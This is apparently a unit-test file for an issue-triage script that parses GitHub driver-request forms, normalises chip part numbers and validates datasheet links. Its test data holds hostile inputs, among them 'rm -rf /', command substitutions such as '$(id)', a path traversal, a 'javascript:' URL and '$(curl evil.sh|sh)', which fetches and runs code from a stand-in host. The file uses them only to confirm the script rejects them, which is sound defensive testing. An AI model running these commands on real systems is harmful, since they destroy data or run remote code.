"""Unit tests for triage.py. Run: python3 -m unittest discover -s tools/triage -v"""

from __future__ import annotations

import json
import re
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import triage as t  # noqa: E402

ROOT = Path(__file__).resolve().parents[2]
FORMS = {
    t.KIND_DRIVER: ROOT / ".github/ISSUE_TEMPLATE/request-driver.yml",
    t.KIND_PORT: ROOT / ".github/ISSUE_TEMPLATE/request-port.yml",
    t.KIND_ERRATUM: ROOT / ".github/ISSUE_TEMPLATE/datasheet-erratum.yml",
}
VENDORS = t.load_vendors()


def driver_body(part="TMP117", datasheet="https://www.ti.com/product/TMP117", confirm=True, extra="",
                documents="https://www.ti.com/lit/er/sbaz055/sbaz055.pdf", prior="_No response_"):
    box = "X" if confirm else " "
    return (
        f"### Part number\n\n{part}\n\n### Vendor\n\nTexas Instruments\n\n### Bus\n\nI2C\n\n"
        f"### Datasheet link\n\n{datasheet}\n\n### Application notes and errata\n\n{documents}\n\n"
        f"### Research and existing code\n\n{prior}\n\n### Variants and packages\n\n_No response_\n\n"
        f"### Features you need first\n\nOne-shot conversion, alert pin.{extra}\n\n"
        "### Target MCU families\n\nESP32 (ESP-IDF), STM32\n\n"
        "### Contribution\n\n- [X] I can test it on hardware\n- [ ] I can review the pull request\n"
        "- [ ] I can write it from driver-template, with review\n\n"
        f"### Confirmation\n\n- [{box}] I searched the existing requests and drivers\n"
        f"- [{box}] The link points to a public page on the vendor's website, and I attached no file and no "
        "confidential or NDA document\n"
    )


def form_labels(path: Path) -> list[tuple[str, str]]:
    """(type, label) of every field in an issue form, read line by line (no YAML library)."""
    out: list[tuple[str, str]] = []
    kind = None
    for line in path.read_text(encoding="utf-8").splitlines():
        m = re.match(r"^  - type: (\w+)", line)
        if m:
            kind = m.group(1)
            continue
        m = re.match(r"^      label: (.+?)\s*$", line)
        if m and kind and kind != "markdown":
            out.append((kind, m.group(1).strip("\"'")))
            kind = None
    return out


class FormsMatchParser(unittest.TestCase):
    def test_every_form_label_is_known(self):
        for kind, path in FORMS.items():
            labels = [label for _, label in form_labels(path)]
            self.assertEqual(sorted(labels), sorted(t.FORM_FIELDS[kind]), path.name)

    def test_ids_match_the_forms(self):
        for kind, path in FORMS.items():
            ids = re.findall(r"^    id: (\S+)", path.read_text(encoding="utf-8"), re.M)
            self.assertEqual(sorted(ids), sorted(t.FORM_FIELDS[kind].values()), path.name)

    def test_part_id_kept_for_prefill_links(self):
        # The configurator links ...?template=request-driver.yml&part=<X>: the id must stay `part`.
        self.assertIn("    id: part\n", FORMS[t.KIND_DRIVER].read_text(encoding="utf-8"))

    def test_forms_set_their_kind_label(self):
        for kind, path in FORMS.items():
            self.assertIn(f'labels: ["{kind}"]', path.read_text(encoding="utf-8"))


class ParseForm(unittest.TestCase):
    def test_fields(self):
        f = t.parse_form(driver_body(), t.FORM_FIELDS[t.KIND_DRIVER])
        self.assertEqual(f["part"], "TMP117")
        self.assertEqual(f["bus"], "I2C")
        self.assertEqual(f["variants"], "")
        self.assertEqual(f["targets"], "ESP32 (ESP-IDF), STM32")
        self.assertEqual(f["contribution"]["I can test it on hardware"], True)
        self.assertEqual(f["contribution"]["I can review the pull request"], False)
        self.assertTrue(all(f["confirm"].values()))

    def test_empty_and_none(self):
        self.assertEqual(t.parse_form(None, t.FORM_FIELDS[t.KIND_DRIVER]), {})
        self.assertEqual(t.parse_form("", t.FORM_FIELDS[t.KIND_DRIVER]), {})

    def test_crlf(self):
        f = t.parse_form(driver_body().replace("\n", "\r\n"), t.FORM_FIELDS[t.KIND_DRIVER])
        self.assertEqual(f["part"], "TMP117")

    def test_heading_inside_answer_cannot_override(self):
        body = driver_body(extra="\n\n### Part number\n\nEVIL;rm -rf /")
        f = t.parse_form(body, t.FORM_FIELDS[t.KIND_DRIVER])
        self.assertEqual(f["part"], "TMP117")

    def test_unknown_heading_stays_in_answer(self):
        body = driver_body(extra="\n\n### Notes\n\nmore")
        f = t.parse_form(body, t.FORM_FIELDS[t.KIND_DRIVER])
        self.assertIn("### Notes", f["features"])

    def test_huge_body_is_bounded(self):
        body = driver_body(extra="A" * 200000)
        f = t.parse_form(body, t.FORM_FIELDS[t.KIND_DRIVER])
        self.assertLessEqual(len(f["features"]), t.MAX_FIELD)


class NormalisePart(unittest.TestCase):
    def test_accepted(self):
        cases = {
            "TMP117": "TMP117", "tmp117": "TMP117", "  bmp581  ": "BMP581", "LM75/NOPB": "LM75",
            "ADS7952-Q1": "ADS7952", "PCA9685-TR": "PCA9685", "LTC2945#PBF": "LTC2945",
            "MAX22200 (SPI)": "MAX22200", "SE050": "SE050", "STM32G431": "STM32G431", "AS5047U": "AS5047U",
            "TLE92466ED": "TLE92466ED", "BNO085": "BNO085", "AT25040B-SSHL-T": "AT25040B-SSHL",
        }
        for raw, want in cases.items():
            self.assertEqual(t.normalise_part(raw), want, raw)

    def test_rejected(self):
        for raw in ["", "   ", "X", "$(id)", "`id`", "a;b", "<b>x</b>", "TMP117\nrm", "@someone", "../../etc",
                    "A" * 70, None, 42, "_No response_", "**BOLD**", "chip:TMP117"]:
            self.assertIsNone(t.normalise_part(raw), repr(raw))

    def test_result_is_a_safe_label(self):
        for raw in ["tmp117", "LM75/NOPB", "ads7952-q1"]:
            part = t.normalise_part(raw)
            self.assertRegex(t.chip_label(part), r"^chip:[A-Z0-9][A-Z0-9._-]+$")
            self.assertLessEqual(len(t.chip_label(part)), 50)  # GitHub's label length limit


class DatasheetUrl(unittest.TestCase):
    def test_accepted(self):
        for url in ["https://www.ti.com/product/TMP117", "https://ti.com/lit/ds/symlink/tmp117.pdf",
                    "https://www.bosch-sensortec.com/products/environmental-sensors/pressure-sensors/bmp581/",
                    "https://www.st.com:443/en/microcontrollers.html", "https://WWW.NXP.COM/docs/x.pdf"]:
            self.assertIsNone(t.check_datasheet_url(url, VENDORS), url)

    def test_rejected(self):
        for url in ["http://www.ti.com/product/TMP117", "https://evil-ti.com/x", "https://ti.com.evil.net/x",
                    "https://user:pw@ti.com/x", "https://ti.com:8443/x", "https://192.0.2.1/x",
                    "https://drive.google.com/file/d/1", "ftp://ti.com/x", "javascript:alert(1)",
                    "https://ti.com/a https://ti.com/b", "", None, "_No response_",
                    "https://github.com/user-attachments/files/123/ds.pdf", "https://[::1]/x",
                    "https://www.alldatasheet.com/x"]:
            self.assertIsNotNone(t.check_datasheet_url(url, VENDORS), repr(url))

    def test_vendor_list_is_clean(self):
        for domain in VENDORS:
            self.assertRegex(domain, r"^[a-z0-9-]+(\.[a-z0-9-]+)+$")
        self.assertEqual(len(VENDORS), len(set(VENDORS)))


class RepoMatch(unittest.TestCase):
    def test_matches(self):
        self.assertEqual(t.repo_matches_part("driver-bmp581", "BMP581"), "exact")
        self.assertEqual(t.repo_matches_part("driver-bno08x", "BNO085"), "family")
        self.assertEqual(t.repo_matches_part("driver-se05x", "SE050"), "family")
        self.assertEqual(t.repo_matches_part("driver-tmc5160", "TMC5160A"), "prefix")
        self.assertEqual(t.repo_matches_part("driver-at25040b", "AT25040B"), "exact")
        self.assertIsNone(t.repo_matches_part("driver-bmp581", "TMP117"))
        self.assertIsNone(t.repo_matches_part("port-esp32", "ESP32"))
        self.assertIsNone(t.repo_matches_part("driver-template", "TMP117"))


class PlanIssue(unittest.TestCase):
    def test_clean_request(self):
        p = t.plan_issue(t.KIND_DRIVER, driver_body(), ["driver-request"], VENDORS)
        self.assertEqual(p.part, "TMP117")
        self.assertEqual(p.add_labels, ["chip:TMP117"])
        self.assertEqual(p.remove_labels, [])
        self.assertEqual(p.notes, [])

    def test_bad_link_and_flags_cleared_on_fix(self):
        p = t.plan_issue(t.KIND_DRIVER, driver_body(datasheet="http://example.com/x.pdf"),
                         ["driver-request"], VENDORS)
        self.assertIn("needs-datasheet", p.add_labels)
        fixed = t.plan_issue(t.KIND_DRIVER, driver_body(), ["driver-request", "needs-datasheet", "chip:TMP117"],
                             VENDORS)
        self.assertEqual(fixed.remove_labels, ["needs-datasheet"])
        self.assertEqual(fixed.add_labels, [])

    def plan(self, **kw):
        return t.plan_issue(t.KIND_DRIVER, driver_body(**kw), ["driver-request"], VENDORS)

    def test_documents_are_vendor_links_or_none_published(self):
        ok = "https://www.ti.com/lit/ug/sbou213/sbou213.pdf\n- https://www.ti.com/lit/er/sbaz055/sbaz055.pdf"
        for documents in (ok, "none published", "None-published"):
            self.assertNotIn("needs-datasheet", self.plan(documents=documents).add_labels, documents)
        for documents in ("_No response_", "https://example.com/appnote.pdf", "see the vendor site",
                          "https://www.ti.com/ok.pdf\nhttp://www.ti.com/plain.pdf"):
            p = self.plan(documents=documents)
            self.assertIn("needs-datasheet", p.add_labels, documents)
            self.assertTrue(any("Application notes and errata" in n for n in p.notes), documents)

    def test_prior_work_is_optional_and_only_shape_checked(self):
        for prior in ("_No response_", "https://github.com/example/tmp117 (GPL-2.0)\nhttps://example.org/paper.pdf"):
            p = self.plan(prior=prior)
            self.assertEqual((p.add_labels, p.notes), (["chip:TMP117"], []), prior)
        for prior in ("ftp://example.com/x", "https://user:pw@example.com/x", "a driver I wrote once"):
            p = self.plan(prior=prior)
            self.assertEqual(p.add_labels, ["chip:TMP117"], prior)  # a note, never a label
            self.assertTrue(any("Research and existing code" in n for n in p.notes), prior)

    def test_part_change_moves_chip_label(self):
        p = t.plan_issue(t.KIND_DRIVER, driver_body(part="TMP116"), ["driver-request", "chip:TMP117"], VENDORS)
        self.assertEqual(p.add_labels, ["chip:TMP116"])
        self.assertEqual(p.remove_labels, ["chip:TMP117"])

    def test_injection_is_not_echoed(self):
        evil = "$(curl evil.sh|sh) `id` @maintainer <script>"
        p = t.plan_issue(t.KIND_DRIVER, driver_body(part=evil, extra=evil), ["driver-request"], VENDORS)
        self.assertIsNone(p.part)
        self.assertIn("needs-info", p.add_labels)
        comment = t.build_comment(p, [], [], None)
        for bad in ("$(", "`id`", "@maintainer", "<script>", "curl"):
            self.assertNotIn(bad, comment)

    def test_attachment_flagged(self):
        body = driver_body(extra="\n\nhttps://github.com/user-attachments/files/1/ds.pdf")
        p = t.plan_issue(t.KIND_DRIVER, body, ["driver-request"], VENDORS)
        self.assertIn("needs-datasheet", p.add_labels)

    def test_image_is_not_an_attachment(self):
        body = driver_body(extra="\n\n![trace](https://github.com/user-attachments/assets/abc)")
        self.assertFalse(t.has_attachment(body))

    def test_unticked_confirmation(self):
        p = t.plan_issue(t.KIND_DRIVER, driver_body(confirm=False), ["driver-request"], VENDORS)
        self.assertIn("needs-info", p.add_labels)

    def test_maintainer_labels_untouched(self):
        p = t.plan_issue(t.KIND_DRIVER, driver_body(), ["driver-request", "chip:TMP117", "agent:ready", "duplicate"],
                         VENDORS)
        self.assertEqual(p.remove_labels, [])

    def test_erratum(self):
        body = ("### Driver repository\n\ndriver-bmp581\n\n### Part number\n\nBMP581\n\n### Document number\n\n"
                "DS004\n\n### Document revision\n\n1.5\n\n### Page, section and table or figure\n\nTable 21\n\n"
                "### What the document says\n\nx\n\n### What the chip does\n\ny\n\n### Seen on hardware\n\n"
                "Yes, on hardware\n\n### Vendor errata link\n\n_No response_\n\n### Confirmation\n\n"
                "- [X] I attached no datasheet and no confidential or NDA document\n")
        p = t.plan_issue(t.KIND_ERRATUM, body, ["erratum"], VENDORS)
        self.assertEqual(p.part, "BMP581")
        self.assertEqual(p.add_labels, ["chip:BMP581"])

    def test_port(self):
        body = ("### MCU family or target\n\nRP2350\n\n### SDK and version\n\nPico SDK 2.1\n\n### RTOS\n\n"
                "FreeRTOS\n\n### Development kit\n\n_No response_\n\n### Drivers you want on it\n\n_No response_\n\n"
                "### Why the existing ports do not fit\n\nNone exists.\n\n### Contribution\n\n"
                "- [ ] I can test it on hardware\n- [ ] I can review the pull request\n\n### Confirmation\n\n"
                "- [X] I searched the existing requests and ports\n"
                "- [X] I attached no file and no confidential or NDA document\n")
        p = t.plan_issue(t.KIND_PORT, body, ["port-request"], VENDORS)
        self.assertIsNone(p.part)
        self.assertEqual(p.add_labels, [])


class FakeGitHub(t.GitHub):
    def __init__(self, issues=None, repos=None, comments=None):
        super().__init__("", dry_run=False, log=lambda _m: None)
        self.writes: list[tuple] = []
        self._issues = issues or []
        self._repos = repos or []
        self._comments = comments or []

    def get(self, path):
        if "/labels" in path or "issues?" in path:
            return self._issues
        if path.startswith("/orgs/"):
            return self._repos
        if path.endswith("/comments?per_page=100"):
            return self._comments
        raise AssertionError(path)

    def write(self, method, path, payload=None):
        self.writes.append((method, path, payload))


class TriageRun(unittest.TestCase):
    def event(self, body, labels=("driver-request",), number=7, state="open"):
        return {"issue": {"number": number, "state": state, "body": body,
                          "labels": [{"name": n} for n in labels]}}

    def test_duplicate_and_driver_links(self):
        gh = FakeGitHub(
            issues=[{"number": 3, "state": "closed", "html_url": "https://github.com/o/r/issues/3"},
                    {"number": 7, "state": "open", "html_url": "https://github.com/o/r/issues/7"}],
            repos=[{"name": "driver-tmp117", "html_url": "https://github.com/o/driver-tmp117"},
                   {"name": "driver-bmp581", "html_url": "https://github.com/o/driver-bmp581"}])
        t.triage(self.event(driver_body()), gh, "o/r", "o", VENDORS, log=lambda _m: None)
        methods = [(m, p) for m, p, _ in gh.writes]
        self.assertIn(("POST", "/repos/o/r/issues/7/labels"), methods)
        comment = [pl for m, p, pl in gh.writes if p.endswith("/comments")][0]["body"]
        self.assertIn("#3", comment)
        self.assertNotIn("#7]", comment)
        self.assertIn("driver-tmp117", comment)
        self.assertNotIn("driver-bmp581", comment)
        self.assertTrue(comment.startswith(t.MARKER))

    def test_existing_comment_is_updated_not_duplicated(self):
        body = driver_body()
        gh = FakeGitHub(comments=[{"id": 99, "body": t.MARKER + "\nold", "user": {"type": "Bot"}}],
                        issues=[{"number": 3, "state": "open", "html_url": "u"}])
        t.triage(self.event(body), gh, "o/r", "o", VENDORS, log=lambda _m: None)
        self.assertIn("PATCH", [m for m, _, _ in gh.writes])
        self.assertNotIn("/repos/o/r/issues/7/comments", [p for m, p, _ in gh.writes if m == "POST"])

    def test_user_comment_with_marker_is_not_edited(self):
        gh = FakeGitHub(comments=[{"id": 5, "body": t.MARKER, "user": {"type": "User"}}],
                        issues=[{"number": 3, "state": "open", "html_url": "u"}])
        t.triage(self.event(driver_body()), gh, "o/r", "o", VENDORS, log=lambda _m: None)
        self.assertNotIn("PATCH", [m for m, _, _ in gh.writes])

    def test_ignores_other_issues(self):
        gh = FakeGitHub()
        self.assertIsNone(t.triage(self.event(driver_body(), labels=("bug",)), gh, "o/r", "o", VENDORS,
                                   log=lambda _m: None))
        self.assertIsNone(t.triage(self.event(driver_body(), state="closed"), gh, "o/r", "o", VENDORS,
                                   log=lambda _m: None))
        self.assertEqual(gh.writes, [])

    def test_dry_run_cli_writes_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "event.json"
            path.write_text(json.dumps(self.event(driver_body(), labels=("bug",))), encoding="utf-8")
            self.assertEqual(t.main(["--event", str(path), "--dry-run"]), 0)


class Workflow(unittest.TestCase):
    """The workflow never puts issue text into a run: script."""

    def test_no_issue_text_in_expressions(self):
        text = (ROOT / ".github/workflows/triage.yml").read_text(encoding="utf-8")
        for expr in re.findall(r"\$\{\{(.*?)\}\}", text):
            self.assertNotRegex(expr, r"issue\.(title|body)|comment|head_ref|label\.name", expr)

    def test_actions_pinned(self):
        for wf in (ROOT / ".github/workflows").glob("*.yml"):
            for ref in re.findall(r"uses:\s*(\S+)", wf.read_text(encoding="utf-8")):
                self.assertRegex(ref, r"@[0-9a-f]{40}$", f"{wf.name}: {ref}")


if __name__ == "__main__":
    unittest.main()
